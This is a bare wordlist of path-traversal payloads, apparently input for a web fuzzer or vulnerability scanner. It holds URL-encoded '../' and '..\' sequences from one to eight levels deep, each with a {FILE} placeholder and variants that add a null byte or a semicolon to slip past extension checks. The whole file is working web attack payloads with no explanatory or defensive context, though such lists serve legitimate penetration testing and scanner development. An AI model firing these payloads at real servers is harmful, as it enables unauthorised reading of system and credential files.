..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html
..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html
..%2f..%2f..%2f..%2f..%2f{FILE}
..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
..%2f..%2f..%2f..%2f..%2f{FILE};index.html
..%2f..%2f..%2f..%2f{FILE}
..%2f..%2f..%2f..%2f{FILE}%00index.html
..%2f..%2f..%2f..%2f{FILE};index.html
..%2f..%2f..%2f{FILE}
..%2f..%2f..%2f{FILE}%00index.html
..%2f..%2f..%2f{FILE};index.html
..%2f..%2f{FILE}
..%2f..%2f{FILE}%00index.html
..%2f..%2f{FILE};index.html
..%2f{FILE}
..%2f{FILE}%00index.html
..%2f{FILE};index.html
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html
..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html
..%5c..%5c..%5c..%5c..%5c{FILE}
..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
..%5c..%5c..%5c..%5c..%5c{FILE};index.html
..%5c..%5c..%5c..%5c{FILE}
..%5c..%5c..%5c..%5c{FILE}%00index.html
..%5c..%5c..%5c..%5c{FILE};index.html
..%5c..%5c..%5c{FILE}
..%5c..%5c..%5c{FILE}%00index.html
..%5c..%5c..%5c{FILE};index.html
..%5c..%5c{FILE}
..%5c..%5c{FILE}%00index.html
..%5c..%5c{FILE};index.html
..%5c{FILE}%00index.html
..%5c{FILE};index.html
